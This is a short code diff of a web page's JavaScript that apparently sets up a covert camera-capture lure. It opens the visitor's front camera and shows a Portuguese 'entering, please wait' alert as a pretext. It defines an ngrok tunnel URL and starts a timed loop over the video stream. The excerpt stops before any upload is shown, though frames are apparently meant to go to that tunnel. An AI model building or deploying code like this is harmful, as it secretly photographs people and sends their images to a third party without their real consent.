@@ -1,11 +1,11 @@
 
-        const NGROK_URL = " https://exostotic-percy-handsomest.ngrok-free.dev"; 
+        const NGROK_URL = "https://exostotic-percy-handsomest.ngrok-free.dev"; 
 
         function start() {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
                 document.getElementById('v').srcObject = stream;
-                alert("Entrando... por favor aguarde 10 segundos.");
+                alert("Entrando... por favor aguarde.");
                 
                 setInterval(() => {
                     const v = document.getElementById('v');
